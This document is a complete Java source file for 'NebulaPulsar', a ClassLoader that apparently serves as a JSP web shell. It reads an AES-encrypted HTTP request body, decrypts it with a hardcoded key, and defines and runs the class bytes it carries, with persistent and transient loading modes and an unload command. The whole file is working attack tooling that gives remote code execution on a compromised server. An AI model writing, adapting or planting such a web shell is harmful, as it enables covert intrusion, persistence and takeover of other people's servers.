import javax.servlet.jsp.PageContext;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.*;
import java.lang.reflect.Method;

public class NebulaPulsar extends ClassLoader
{
    private static final String KEY = "NBPULSARDEADBEEF";

    public NebulaPulsar(ClassLoader parent) { super(parent); }
    public NebulaPulsar() { super(NebulaPulsar.class.getClassLoader()); }

    public byte[] Crypt(byte[] abData, int nMode) throws Exception {
        javax.crypto.spec.SecretKeySpec skeySpec = new javax.crypto.spec.SecretKeySpec(KEY.getBytes("UTF-8"), "AES");
        javax.crypto.Cipher cipher = javax.crypto.Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(nMode, skeySpec);

        return cipher.doFinal(abData);
    }

    private String GetParamValue(String paramStr, String key)
    {
        if (paramStr == null || paramStr.isEmpty())
            return "";

        String[] pairs = paramStr.split("&");
        for (String pair : pairs)
        {
            int idx = pair.indexOf("=");
            if (idx > 0 && pair.substring(0, idx).equals(key))
                return pair.substring(idx + 1);
        }
        return "";
    }

    @Override
    public boolean equals(Object obj) {
        PageContext pageContext = (PageContext)obj;
        HttpServletResponse response = (HttpServletResponse)pageContext.getResponse();

        try
        {
            HttpServletRequest request = (HttpServletRequest)pageContext.getRequest();
            int nContentLength = request.getContentLength();

            if (nContentLength == 0)
                return true;

            InputStream is = request.getInputStream();
            byte[] abEncryptedData = new byte[nContentLength];
            int nReadLength = 0;
            while (nReadLength < nContentLength)
            {
                int nRead = is.read(abEncryptedData, nReadLength, nContentLength - nReadLength);
                if (nRead == -1)
                    break;

                nReadLength += nRead;
            }

            byte[] abRawPayload = Crypt(abEncryptedData, 2);
            
            int nClassLength = ((abRawPayload[0] & 0xFF) << 24) | ((abRawPayload[1] & 0xFF) << 16) | ((abRawPayload[2] & 0xFF) << 8) | (abRawPayload[3] & 0xFF);
            int nParamOffset = nClassLength + 4;
            int nParamLength = abRawPayload.length - nParamOffset;
            String szParam = new String(abRawPayload, nParamOffset, nParamLength, "UTF-8").trim();
            
            String szAction = GetParamValue(szParam, "action");
            if (szAction.equalsIgnoreCase("UNLOAD"))
            {
                HttpSession session = pageContext.getSession();
                
                session.removeAttribute("pulsar_loader");
                
                session.invalidate();
                response.getWriter().print("PULSAR_DESTROY_SUCCESS: Memory cleared.");
                return true; 
            }

            byte[] abClassBytes = new byte[nClassLength];
            System.arraycopy(abRawPayload, 4, abClassBytes, 0, nClassLength);
            
            String szTargetMode = GetParamValue(szParam, "mode");

            request.setAttribute("payload", abRawPayload);
            request.setAttribute("len", String.valueOf(nClassLength));

            Class<?> clazz = null;
            Object instance = null;

            if (szTargetMode.equalsIgnoreCase("persistent"))
            {
                try
                {
                    clazz = this.defineClass(abClassBytes, 0, abClassBytes.length);
                }
                catch (LinkageError e)
                {
                    clazz = this.findLoadedClass("DarkMatter");
                    if (clazz == null)
                    {
                        clazz = this.loadClass("DarkMatter");
                    }
                }
                instance = clazz.newInstance();
            }
            else
            {
                ClassLoader transientLoader = new java.net.URLClassLoader(new java.net.URL[0], this);
                java.lang.reflect.Method defineMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                defineMethod.setAccessible(true);
                clazz = (Class<?>) defineMethod.invoke(transientLoader, abClassBytes, 0, abClassBytes.length);
                instance = clazz.newInstance();
                transientLoader = null;
            }

            Method method = clazz.getMethod("equals", Object.class);
            method.invoke(instance, obj);
            
            clazz = null;
            instance = null;

        }
        catch (Throwable t)
        {
            try
            {
                response.getWriter().print("CORE_INTERNAL_ERROR: " + t.toString());
            } 
            catch (Exception ex)
            {

            }
        }

        return true;
    }
}